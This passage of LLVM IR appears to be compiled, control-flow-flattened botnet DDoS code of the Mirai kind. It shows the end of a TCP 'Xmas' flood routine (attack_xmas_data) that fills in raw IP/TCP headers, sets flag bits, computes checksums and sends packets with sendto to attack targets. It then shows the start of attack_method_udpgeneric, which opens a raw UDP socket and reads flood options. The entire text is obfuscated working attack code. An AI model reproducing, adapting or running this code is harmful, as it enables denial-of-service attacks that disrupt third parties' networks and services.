  %295 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %292, i64 %294
  %296 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %295, i32 0, i32 4
  store i16 %291, i16* %296, align 2
  %297 = load i32, i32* %24, align 4
  %298 = sext i32 %297 to i64
  %299 = add i64 40, %298
  %300 = call noalias i8* @malloc(i64 %299) #7
  %301 = load i8**, i8*** %12, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8*, i8** %301, i64 %303
  store i8* %300, i8** %304, align 8
  %305 = load i8**, i8*** %12, align 8
  %306 = load i32, i32* %9, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds i8*, i8** %305, i64 %307
  %309 = load i8*, i8** %308, align 8
  %310 = bitcast i8* %309 to %struct.iphdr*
  store %struct.iphdr* %310, %struct.iphdr** %36, align 8
  %311 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i64 1
  %313 = bitcast %struct.iphdr* %312 to %struct.tcphdr*
  store %struct.tcphdr* %313, %struct.tcphdr** %37, align 8
  %314 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i64 1
  %316 = bitcast %struct.tcphdr* %315 to i8*
  store i8* %316, i8** %38, align 8
  %317 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %318 = bitcast %struct.iphdr* %317 to i8*
  %319 = load i8, i8* %318, align 4
  %320 = and i8 %319, 15
  %321 = or i8 %320, 64
  store i8 %321, i8* %318, align 4
  %322 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %323 = bitcast %struct.iphdr* %322 to i8*
  %324 = load i8, i8* %323, align 4
  %325 = and i8 %324, -16
  %326 = or i8 %325, 5
  store i8 %326, i8* %323, align 4
  %327 = load i8, i8* %13, align 1
  %328 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 1
  store i8 %327, i8* %329, align 1
  %330 = load i32, i32* %24, align 4
  %331 = sext i32 %330 to i64
  %332 = add i64 40, %331
  %333 = trunc i64 %332 to i16
  %334 = call zeroext i16 @htons(i16 zeroext %333) #8
  %335 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 2
  store i16 %334, i16* %336, align 2
  %337 = load i16, i16* %14, align 2
  %338 = call zeroext i16 @htons(i16 zeroext %337) #8
  %339 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 3
  store i16 %338, i16* %340, align 4
  %341 = load i8, i8* %15, align 1
  %342 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %343 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %342, i32 0, i32 5
  store i8 %341, i8* %343, align 4
  %344 = load i8, i8* %16, align 1
  %345 = icmp ne i8 %344, 0
  %346 = select i1 %345, i32 -111607719, i32 707192522
  store i32 %346, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  %348 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %349 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %350 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %349, i32 0, i32 4
  store i16 %348, i16* %350, align 2
  store i32 707192522, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %353 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %352, i32 0, i32 6
  store i8 6, i8* %353, align 1
  %354 = load i32, i32* @LOCAL_ADDR, align 4
  %355 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i32 0, i32 8
  store i32 %354, i32* %356, align 4
  %357 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %358 = load i32, i32* %9, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %357, i64 %359
  %361 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %360, i32 0, i32 0
  %362 = load i32, i32* %361, align 4
  %363 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %364 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %363, i32 0, i32 9
  store i32 %362, i32* %364, align 4
  %365 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %366 = load i32, i32* %9, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %365, i64 %367
  %369 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %368, i32 0, i32 3
  %370 = load i16, i16* %369, align 4
  %371 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %372 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %371, i32 0, i32 0
  store i16 %370, i16* %372, align 4
  %373 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %374 = load i32, i32* %9, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %373, i64 %375
  %377 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %376, i32 0, i32 4
  %378 = load i16, i16* %377, align 2
  %379 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %380 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %379, i32 0, i32 1
  store i16 %378, i16* %380, align 2
  %381 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %382 = load i32, i32* %9, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %381, i64 %383
  %385 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %384, i32 0, i32 2
  %386 = load i32, i32* %385, align 4
  %387 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %388 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %387, i32 0, i32 2
  store i32 %386, i32* %388, align 4
  %389 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %390 = load i32, i32* %9, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %389, i64 %391
  %393 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %392, i32 0, i32 1
  %394 = load i32, i32* %393, align 4
  %395 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %396 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %395, i32 0, i32 3
  store i32 %394, i32* %396, align 4
  %397 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %398 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %397, i32 0, i32 4
  %399 = load i16, i16* %398, align 4
  %400 = and i16 %399, -241
  %401 = or i16 %400, 128
  store i16 %401, i16* %398, align 4
  %402 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %403 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %402, i32 0, i32 4
  %404 = load i16, i16* %403, align 4
  %405 = and i16 %404, -257
  %406 = or i16 %405, 256
  store i16 %406, i16* %403, align 4
  %407 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %408 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %407, i32 0, i32 4
  %409 = load i16, i16* %408, align 4
  %410 = and i16 %409, -4097
  %411 = or i16 %410, 4096
  store i16 %411, i16* %408, align 4
  %412 = call i32 @rand_next()
  %413 = and i32 %412, 65535
  %414 = trunc i32 %413 to i16
  %415 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %416 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %415, i32 0, i32 5
  store i16 %414, i16* %416, align 2
  %417 = load i8, i8* %18, align 1
  %418 = sext i8 %417 to i16
  %419 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %420 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %419, i32 0, i32 4
  %421 = load i16, i16* %420, align 4
  %422 = and i16 %418, 1
  %423 = shl i16 %422, 13
  %424 = and i16 %421, -8193
  %425 = or i16 %424, %423
  store i16 %425, i16* %420, align 4
  %426 = load i8, i8* %19, align 1
  %427 = sext i8 %426 to i16
  %428 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %429 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %428, i32 0, i32 4
  %430 = load i16, i16* %429, align 4
  %431 = and i16 %427, 1
  %432 = shl i16 %431, 12
  %433 = and i16 %430, -4097
  %434 = or i16 %433, %432
  store i16 %434, i16* %429, align 4
  %435 = load i8, i8* %20, align 1
  %436 = sext i8 %435 to i16
  %437 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %438 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %437, i32 0, i32 4
  %439 = load i16, i16* %438, align 4
  %440 = and i16 %436, 1
  %441 = shl i16 %440, 11
  %442 = and i16 %439, -2049
  %443 = or i16 %442, %441
  store i16 %443, i16* %438, align 4
  %444 = load i8, i8* %21, align 1
  %445 = sext i8 %444 to i16
  %446 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %447 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %446, i32 0, i32 4
  %448 = load i16, i16* %447, align 4
  %449 = and i16 %445, 1
  %450 = shl i16 %449, 10
  %451 = and i16 %448, -1025
  %452 = or i16 %451, %450
  store i16 %452, i16* %447, align 4
  %453 = load i8, i8* %22, align 1
  %454 = sext i8 %453 to i16
  %455 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %456 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %455, i32 0, i32 4
  %457 = load i16, i16* %456, align 4
  %458 = and i16 %454, 1
  %459 = shl i16 %458, 9
  %460 = and i16 %457, -513
  %461 = or i16 %460, %459
  store i16 %461, i16* %456, align 4
  %462 = load i8, i8* %23, align 1
  %463 = sext i8 %462 to i16
  %464 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %465 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %464, i32 0, i32 4
  %466 = load i16, i16* %465, align 4
  %467 = and i16 %463, 1
  %468 = shl i16 %467, 8
  %469 = and i16 %466, -257
  %470 = or i16 %469, %468
  store i16 %470, i16* %465, align 4
  %471 = load i8*, i8** %38, align 8
  %472 = load i32, i32* %24, align 4
  call void @rand_str(i8* %471, i32 %472)
  store i32 -1728892030, i32* %switchVar
  br label %loopEnd

; <label>:473:                                    ; preds = %loopEntry
  %474 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %475 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %474, i32 0, i32 4
  %476 = load i16, i16* %475, align 4
  %477 = lshr i16 %476, 8
  %478 = and i16 %477, 1
  %479 = zext i16 %478 to i32
  %480 = icmp ne i32 %479, 0
  %481 = select i1 %480, i32 -423975433, i32 -998658474
  store i32 %481, i32* %switchVar
  br label %loopEnd

; <label>:482:                                    ; preds = %loopEntry
  %483 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %484 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %483, i32 0, i32 4
  %485 = load i16, i16* %484, align 4
  %486 = lshr i16 %485, 10
  %487 = and i16 %486, 1
  %488 = zext i16 %487 to i32
  %489 = icmp ne i32 %488, 0
  %490 = select i1 %489, i32 -423975433, i32 1805369366
  store i32 %490, i32* %switchVar
  br label %loopEnd

; <label>:491:                                    ; preds = %loopEntry
  %492 = load i32, i32* %26, align 4
  %493 = call i32 @close(i32 %492)
  store i32 859936315, i32* %switchVar
  br label %loopEnd

; <label>:494:                                    ; preds = %loopEntry
  store i32 1136020294, i32* %switchVar
  br label %loopEnd

; <label>:495:                                    ; preds = %loopEntry
  store i32 467226309, i32* %switchVar
  br label %loopEnd

; <label>:496:                                    ; preds = %loopEntry
  store i32 1819051964, i32* %switchVar
  br label %loopEnd

; <label>:497:                                    ; preds = %loopEntry
  %498 = call i64 @time(i64* null) #7
  %499 = load i64, i64* %31, align 8
  %500 = sub nsw i64 %498, %499
  %501 = icmp sgt i64 %500, 10
  %502 = select i1 %501, i32 -231164070, i32 1228743892
  store i32 %502, i32* %switchVar
  br label %loopEnd

; <label>:503:                                    ; preds = %loopEntry
  %504 = load i32, i32* %26, align 4
  %505 = call i32 @close(i32 %504)
  store i32 859936315, i32* %switchVar
  br label %loopEnd

; <label>:506:                                    ; preds = %loopEntry
  store i32 1743172653, i32* %switchVar
  br label %loopEnd

; <label>:507:                                    ; preds = %loopEntry
  store i32 1419412550, i32* %switchVar
  br label %loopEnd

; <label>:508:                                    ; preds = %loopEntry
  %509 = load i32, i32* %9, align 4
  %510 = add nsw i32 %509, 1
  store i32 %510, i32* %9, align 4
  store i32 -454187251, i32* %switchVar
  br label %loopEnd

; <label>:511:                                    ; preds = %loopEntry
  store i32 1748694781, i32* %switchVar
  br label %loopEnd

; <label>:512:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 71164904, i32* %switchVar
  br label %loopEnd

; <label>:513:                                    ; preds = %loopEntry
  %514 = load i32, i32* %9, align 4
  %515 = load i8, i8* %5, align 1
  %516 = zext i8 %515 to i32
  %517 = icmp slt i32 %514, %516
  %518 = select i1 %517, i32 2125387852, i32 -806330094
  store i32 %518, i32* %switchVar
  br label %loopEnd

; <label>:519:                                    ; preds = %loopEntry
  %520 = load i8**, i8*** %12, align 8
  %521 = load i32, i32* %9, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds i8*, i8** %520, i64 %522
  %524 = load i8*, i8** %523, align 8
  store i8* %524, i8** %39, align 8
  %525 = load i8*, i8** %39, align 8
  %526 = bitcast i8* %525 to %struct.iphdr*
  store %struct.iphdr* %526, %struct.iphdr** %40, align 8
  %527 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %528 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %527, i64 1
  %529 = bitcast %struct.iphdr* %528 to %struct.tcphdr*
  store %struct.tcphdr* %529, %struct.tcphdr** %41, align 8
  %530 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %531 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %530, i64 1
  %532 = bitcast %struct.tcphdr* %531 to i8*
  store i8* %532, i8** %42, align 8
  %533 = load i16, i16* %14, align 2
  %534 = zext i16 %533 to i32
  %535 = icmp eq i32 %534, 65535
  %536 = select i1 %535, i32 1116551493, i32 475734126
  store i32 %536, i32* %switchVar
  br label %loopEnd

; <label>:537:                                    ; preds = %loopEntry
  %538 = call i32 @rand_next()
  %539 = and i32 %538, 65535
  %540 = trunc i32 %539 to i16
  %541 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %542 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %541, i32 0, i32 3
  store i16 %540, i16* %542, align 4
  store i32 475734126, i32* %switchVar
  br label %loopEnd

; <label>:543:                                    ; preds = %loopEntry
  %544 = load i8, i8* %25, align 1
  %545 = icmp ne i8 %544, 0
  %546 = select i1 %545, i32 -1629423754, i32 -1447358133
  store i32 %546, i32* %switchVar
  br label %loopEnd

; <label>:547:                                    ; preds = %loopEntry
  %548 = load i8*, i8** %42, align 8
  %549 = load i32, i32* %24, align 4
  call void @rand_str(i8* %548, i32 %549)
  store i32 -1447358133, i32* %switchVar
  br label %loopEnd

; <label>:550:                                    ; preds = %loopEntry
  %551 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %552 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %551, i32 0, i32 7
  store i16 0, i16* %552, align 2
  %553 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %554 = bitcast %struct.iphdr* %553 to i16*
  %555 = call zeroext i16 @checksum_generic(i16* %554, i32 20)
  %556 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %557 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %556, i32 0, i32 7
  store i16 %555, i16* %557, align 2
  %558 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %559 = load i32, i32* %9, align 4
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %558, i64 %560
  %562 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %561, i32 0, i32 1
  %563 = load i32, i32* %562, align 4
  %564 = add i32 %563, 1
  store i32 %564, i32* %562, align 4
  %565 = trunc i32 %563 to i16
  %566 = call zeroext i16 @htons(i16 zeroext %565) #8
  %567 = zext i16 %566 to i32
  %568 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %569 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %568, i32 0, i32 2
  store i32 %567, i32* %569, align 4
  %570 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %571 = load i32, i32* %9, align 4
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %570, i64 %572
  %574 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %573, i32 0, i32 2
  %575 = load i32, i32* %574, align 4
  %576 = trunc i32 %575 to i16
  %577 = call zeroext i16 @htons(i16 zeroext %576) #8
  %578 = zext i16 %577 to i32
  %579 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %580 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %579, i32 0, i32 3
  store i32 %578, i32* %580, align 4
  %581 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %582 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %581, i32 0, i32 6
  store i16 0, i16* %582, align 4
  %583 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %584 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %585 = bitcast %struct.tcphdr* %584 to i8*
  %586 = load i32, i32* %24, align 4
  %587 = sext i32 %586 to i64
  %588 = add i64 20, %587
  %589 = trunc i64 %588 to i16
  %590 = call zeroext i16 @htons(i16 zeroext %589) #8
  %591 = load i32, i32* %24, align 4
  %592 = sext i32 %591 to i64
  %593 = add i64 20, %592
  %594 = trunc i64 %593 to i32
  %595 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %583, i8* %585, i16 zeroext %590, i32 %594)
  %596 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %597 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %596, i32 0, i32 6
  store i16 %595, i16* %597, align 4
  %598 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %599 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %598, i32 0, i32 1
  %600 = load i16, i16* %599, align 2
  %601 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %602 = load i32, i32* %9, align 4
  %603 = sext i32 %602 to i64
  %604 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %601, i64 %603
  %605 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %604, i32 0, i32 0
  %606 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %605, i32 0, i32 1
  store i16 %600, i16* %606, align 2
  %607 = load i32, i32* %10, align 4
  %608 = load i8*, i8** %39, align 8
  %609 = load i32, i32* %24, align 4
  %610 = sext i32 %609 to i64
  %611 = add i64 40, %610
  %612 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %613 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %614 = load i32, i32* %9, align 4
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %613, i64 %615
  %617 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %616, i32 0, i32 0
  %618 = bitcast %struct.sockaddr_in* %617 to %struct.sockaddr*
  store %struct.sockaddr* %618, %struct.sockaddr** %612, align 8
  %619 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %620 = load %struct.sockaddr*, %struct.sockaddr** %619, align 8
  %621 = call i64 @sendto(i32 %607, i8* %608, i64 %611, i32 16384, %struct.sockaddr* %620, i32 16)
  store i32 -801947389, i32* %switchVar
  br label %loopEnd

; <label>:622:                                    ; preds = %loopEntry
  %623 = load i32, i32* %9, align 4
  %624 = add nsw i32 %623, 1
  store i32 %624, i32* %9, align 4
  store i32 71164904, i32* %switchVar
  br label %loopEnd

; <label>:625:                                    ; preds = %loopEntry
  store i32 1748694781, i32* %switchVar
  br label %loopEnd

; <label>:626:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %625, %622, %550, %547, %543, %537, %519, %513, %512, %511, %508, %507, %506, %503, %497, %496, %495, %494, %491, %482, %473, %351, %347, %255, %246, %237, %224, %219, %210, %209, %197, %189, %185, %180, %175, %166, %145, %129, %128, %124, %123, %117, %116, %113, %107, %106, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpgeneric(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #7
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 2, i32 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 3, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 4, i32 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 5, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 6, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 7, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 0, i32 512)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 1, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @LOCAL_ADDR, align 4
  %67 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 25, i32 %66)
  store i32 %67, i32* %20, align 4
  %68 = load i16, i16* %18, align 2
  %69 = zext i16 %68 to i32
  store i32 %69, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 632415971, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 632415971, label %first
    i32 -991220857, label %72
    i32 -1135180678, label %73
    i32 -2006929032, label %77
    i32 -1795996228, label %78
    i32 1604271948, label %84
    i32 -488293415, label %87
    i32 -1643562135, label %88
    i32 -1091729085, label %94
    i32 -469046840, label %139
    i32 -71374552, label %143
    i32 1526947100, label %172
    i32 -1325806784, label %175
    i32 1748670866, label %176
    i32 -394579442, label %177
    i32 -1692357895, label %183
    i32 141987443, label %206
    i32 -1289594982, label %227
    i32 282628909, label %231
    i32 -1876198749, label %235
    i32 1402640697, label %240
    i32 -2075354006, label %245
    i32 -739642138, label %250
    i32 -992353963, label %255
    i32 10759256, label %260
    i32 1611035465, label %265
    i32 -1755176479, label %269
    i32 1098486362, label %273
    i32 1173836015, label %320
    i32 1374788889, label %323
    i32 -1327866047, label %324
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %70 = icmp sgt i32 %.reload, 1460
  %71 = select i1 %70, i32 -991220857, i32 -1135180678
  store i32 %71, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  store i16 1460, i16* %18, align 2
  store i32 -1135180678, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = call i32 @socket(i32 2, i32 3, i32 17) #7
  store i32 %74, i32* %10, align 4
  %75 = icmp eq i32 %74, -1
  %76 = select i1 %75, i32 -2006929032, i32 -1795996228
  store i32 %76, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  store i32 -1327866047, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %79 = load i32, i32* %10, align 4
  %80 = bitcast i32* %9 to i8*
  %81 = call i32 @setsockopt(i32 %79, i32 0, i32 3, i8* %80, i32 4) #7
  %82 = icmp eq i32 %81, -1
  %83 = select i1 %82, i32 1604271948, i32 -488293415
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %10, align 4
  %86 = call i32 @close(i32 %85)
  store i32 -1327866047, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1643562135, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %9, align 4
  %90 = load i8, i8* %5, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp slt i32 %89, %91
  %93 = select i1 %92, i32 -1091729085, i32 -1325806784
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = call noalias i8* @calloc(i64 1510, i64 1) #7
  %96 = load i8**, i8*** %11, align 8
  %97 = load i32, i32* %9, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8*, i8** %96, i64 %98
  store i8* %95, i8** %99, align 8
  %100 = load i8**, i8*** %11, align 8
  %101 = load i32, i32* %9, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8*, i8** %100, i64 %102
  %104 = load i8*, i8** %103, align 8
  %105 = bitcast i8* %104 to %struct.iphdr*
  store %struct.iphdr* %105, %struct.iphdr** %21, align 8
  %106 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %107 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %106, i64 1
  %108 = bitcast %struct.iphdr* %107 to %struct.udphdr*
  store %struct.udphdr* %108, %struct.udphdr** %22, align 8
  %109 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %110 = bitcast %struct.iphdr* %109 to i8*
  %111 = load i8, i8* %110, align 4
  %112 = and i8 %111, 15
  %113 = or i8 %112, 64
  store i8 %113, i8* %110, align 4
  %114 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %115 = bitcast %struct.iphdr* %114 to i8*
  %116 = load i8, i8* %115, align 4
  %117 = and i8 %116, -16
  %118 = or i8 %117, 5
  store i8 %118, i8* %115, align 4
